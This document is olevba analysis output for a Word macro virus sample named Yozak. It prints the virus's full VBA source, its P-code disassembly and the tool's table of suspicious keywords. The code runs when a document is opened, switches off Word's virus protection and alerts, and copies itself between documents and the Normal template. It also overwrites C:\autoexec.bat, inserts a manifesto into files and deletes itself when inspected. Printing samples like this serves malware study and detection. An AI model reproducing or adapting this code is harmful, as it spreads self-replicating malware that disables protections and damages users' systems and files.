olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Yozak.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Yozak.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Application.DisplayAlerts = wdAlertsNone
Application.EnableCancelKey = wdCancelDisabled
Dim ni As Boolean, ai As Boolean
If NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.Lines(3, 3) = "Options.VirusProtection = False" Then ni = True
If ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.Lines(3, 3) = "Options.VirusProtection = False" Then ai = True
x = VBE.ActiveVbproject.VBComponents("ThisDocument").CodeModule.Lines(1, 86)
If ni = True And ai = False Then
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromString x
ElseIf ni = False And ai = True Then
NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromString x
End If
Payloader
z = "R" & Int(2354365 * Rnd)
VBE.ActiveVbproject.VBComponents("ThisDocument").CodeModule.ReplaceLine 17, z
VBE.ActiveVbproject.VBComponents("ThisDocument").CodeModule.ReplaceLine 22, "Sub " & z & "()"
End Sub
Sub Payloader()
On Error Resume Next
Randomize
If Day(Now) = Minute(Now) Then
For x = 1 To Int(6000009 * Rnd)
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE", "Stupid") = "Free Vic."
Next x
Open "C:\autoexec.bat" For Output As F
Print F; "echo Free Vic."
Print F; "echo 3C supoorts you Vic."
Print F; "Echo All VX scene support you Vic."
Print F; "echo Free Vic."
CommandBars(Int(9 * Rnd)).Name = "-Free Vic.-"
End If
End Sub
Sub HelpAbout()
MsgBox "-Free Vic-", vbApplicationModal, "Yo"
End Sub
Sub ViewVbCode()
On Error Resume Next
MsgBox "-Free Vic-"
NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.deletelines 1, 86
NormalTemplate.Saved = False
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.deletelines 1, 86
Application.ShowVisualBasicEditor = True
End Sub
Sub FileSave()
On Error Resume Next
Randomize
If Month(Now) = Int(12 * Rnd) Then
MsgBox "-Free Vic-", vbCritical, "3C"
Selection.MoveStart
Selection.TypeText "WE use knowledge to create life."
Selection.TypeText "You use knowledge to kill life."
Selection.TypeText "And You call US criminals."
Selection.TypeText "You make drugs and YOU call US criminals"
Selection.TypeText "You make war and YOU call Us criminals"
Selection.TypeText "You let people die and YOU call US criminals"
Selection.TypeText "You use atomic energy for bombs and YOU call US criminals"
Selection.TypeText "You destroy the environment and YOU call US criminals"
Selection.TypeText "You spread disease and YOU call US criminals"
Selection.TypeText "You pedophilia and YOU call US criminals"
Selection.TypeText "YES we are CRIMINALS and our CRIME is to share"
Selection.TypeText "Our knowledge. But in comparison what you have DONE"
Selection.TypeText "WE are angels."
Selection.TypeText "Dr.yozak"
Selection.TypeText "It's the 3C way of thinking"
Selection.TypeText "-FREE VIC-"
Beep
MsgBox "Free Vic.", vbApplicationModal, "___________"
End If
ActiveDocument.Save
End Sub
Sub FileClose()
If Day(Now) = 1 Or Day(Now) = 30 Then
MsgBox "3C way of thinking", vbApplicationModal, ":P"
Open "c:\readme.txt" For Random As gr
Print gr; "It's the 3C way of thinking we are smoking blasting drinking."
Print gr; "free vic "
Print gr; "CCC-members.xoom.com/CCCriminals-CCC"
Close gr
MsgBox "Money or the Power"
MsgBox "Power or the Money"
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Intended.Yozak.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7646 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #6:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #7:
' 	Dim 
' 	VarDefn ni (As Boolean)
' 	VarDefn ai (As Boolean)
' Line #8:
' 	LitDI2 0x0003 
' 	LitDI2 0x0003 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ni 
' 	EndIf 
' Line #9:
' 	LitDI2 0x0003 
' 	LitDI2 0x0003 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ai 
' 	EndIf 
' Line #10:
' 	LitDI2 0x0001 
' 	LitDI2 0x0056 
' 	LitStr 0x000C "ThisDocument"
' 	Ld VBE 
' 	MemLd ActiveVbproject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St x 
' Line #11:
' 	Ld ni 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ai 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #12:
' 	Ld x 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #13:
' 	Ld ni 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld ai 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #14:
' 	Ld x 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	ArgsCall Payloader 0x0000 
' Line #17:
' 	LitStr 0x0001 "R"
' 	LitDI4 0xECBD 0x0023 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St z 
' Line #18:
' 	LitDI2 0x0011 
' 	Ld z 
' 	LitStr 0x000C "ThisDocument"
' 	Ld VBE 
' 	MemLd ActiveVbproject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #19:
' 	LitDI2 0x0016 
' 	LitStr 0x0004 "Sub "
' 	Ld z 
' 	Concat 
' 	LitStr 0x0002 "()"
' 	Concat 
' 	LitStr 0x000C "ThisDocument"
' 	Ld VBE 
' 	MemLd ActiveVbproject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Sub Payloader())
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' 	ArgsCall Read 0x0000 
' Line #24:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x8D89 0x005B 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #26:
' 	LitStr 0x0009 "Free Vic."
' 	LitStr 0x0000 ""
' 	LitStr 0x0012 "HKEY_LOCAL_MACHINE"
' 	LitStr 0x0006 "Stupid"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #27:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	LitStr 0x000F "C:\autoexec.bat"
' 	Ld False 
' 	LitDefault 
' 	Open (For Output)
' Line #29:
' 	MeImplicit 
' 	PrintObj 
' 	Ld False 
' 	PrintItemSemi 
' 	LitStr 0x000E "echo Free Vic."
' 	PrintItemNL 
' Line #30:
' 	MeImplicit 
' 	PrintObj 
' 	Ld False 
' 	PrintItemSemi 
' 	LitStr 0x0019 "echo 3C supoorts you Vic."
' 	PrintItemNL 
' Line #31:
' 	MeImplicit 
' 	PrintObj 
' 	Ld False 
' 	PrintItemSemi 
' 	LitStr 0x0022 "Echo All VX scene support you Vic."
' 	PrintItemNL 
' Line #32:
' 	MeImplicit 
' 	PrintObj 
' 	Ld False 
' 	PrintItemSemi 
' 	LitStr 0x000E "echo Free Vic."
' 	PrintItemNL 
' Line #33:
' 	LitStr 0x000B "-Free Vic.-"
' 	LitDI2 0x0009 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd CommandBars 0x0001 
' 	MemSt New 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub HelpAbout())
' Line #37:
' 	LitStr 0x000A "-Free Vic-"
' 	Ld vbApplicationModal 
' 	LitStr 0x0002 "Yo"
' 	ArgsCall MsgBox 0x0003 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Sub ViewVbCode())
' Line #40:
' 	OnError (Resume Next) 
' Line #41:
' 	LitStr 0x000A "-Free Vic-"
' 	ArgsCall MsgBox 0x0001 
' Line #42:
' 	LitDI2 0x0001 
' 	LitDI2 0x0056 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #43:
' 	LitVarSpecial (False)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #44:
' 	LitDI2 0x0001 
' 	LitDI2 0x0056 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #45:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Sub FileSave())
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	ArgsCall Read 0x0000 
' Line #50:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	Eq 
' 	IfBlock 
' Line #51:
' 	LitStr 0x000A "-Free Vic-"
' 	Ld vbCritical 
' 	LitStr 0x0002 "3C"
' 	ArgsCall MsgBox 0x0003 
' Line #52:
' 	Ld Selection 
' 	ArgsMemCall MoveStart 0x0000 
' Line #53:
' 	LitStr 0x0020 "WE use knowledge to create life."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #54:
' 	LitStr 0x001F "You use knowledge to kill life."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #55:
' 	LitStr 0x001A "And You call US criminals."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #56:
' 	LitStr 0x0028 "You make drugs and YOU call US criminals"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #57:
' 	LitStr 0x0026 "You make war and YOU call Us criminals"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #58:
' 	LitStr 0x002C "You let people die and YOU call US criminals"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #59:
' 	LitStr 0x0039 "You use atomic energy for bombs and YOU call US criminals"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #60:
' 	LitStr 0x0035 "You destroy the environment and YOU call US criminals"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #61:
' 	LitStr 0x002C "You spread disease and YOU call US criminals"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #62:
' 	LitStr 0x0028 "You pedophilia and YOU call US criminals"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #63:
' 	LitStr 0x002E "YES we are CRIMINALS and our CRIME is to share"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #64:
' 	LitStr 0x0033 "Our knowledge. But in comparison what you have DONE"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #65:
' 	LitStr 0x000E "WE are angels."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #66:
' 	LitStr 0x0008 "Dr.yozak"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #67:
' 	LitStr 0x001B "It's the 3C way of thinking"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #68:
' 	LitStr 0x000A "-FREE VIC-"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #69:
' 	ArgsCall Beep 0x0000 
' Line #70:
' 	LitStr 0x0009 "Free Vic."
' 	Ld vbApplicationModal 
' 	LitStr 0x000B "___________"
' 	ArgsCall MsgBox 0x0003 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Sub FileClose())
' Line #75:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #76:
' 	LitStr 0x0012 "3C way of thinking"
' 	Ld vbApplicationModal 
' 	LitStr 0x0002 ":P"
' 	ArgsCall MsgBox 0x0003 
' Line #77:
' 	LitStr 0x000D "c:\readme.txt"
' 	Ld gr 
' 	LitDefault 
' 	Open (For Random)
' Line #78:
' 	MeImplicit 
' 	PrintObj 
' 	Ld gr 
' 	PrintItemSemi 
' 	LitStr 0x003D "It's the 3C way of thinking we are smoking blasting drinking."
' 	PrintItemNL 
' Line #79:
' 	MeImplicit 
' 	PrintObj 
' 	Ld gr 
' 	PrintItemSemi 
' 	LitStr 0x0009 "free vic "
' 	PrintItemNL 
' Line #80:
' 	MeImplicit 
' 	PrintObj 
' 	Ld gr 
' 	PrintItemSemi 
' 	LitStr 0x0024 "CCC-members.xoom.com/CCCriminals-CCC"
' 	PrintItemNL 
' Line #81:
' 	Ld gr 
' 	Close 0x0001 
' Line #82:
' 	LitStr 0x0012 "Money or the Power"
' 	ArgsCall MsgBox 0x0001 
' Line #83:
' 	LitStr 0x0012 "Power or the Money"
' 	ArgsCall MsgBox 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	EndSub 
' Line #86:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|kill                |May delete a file                            |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

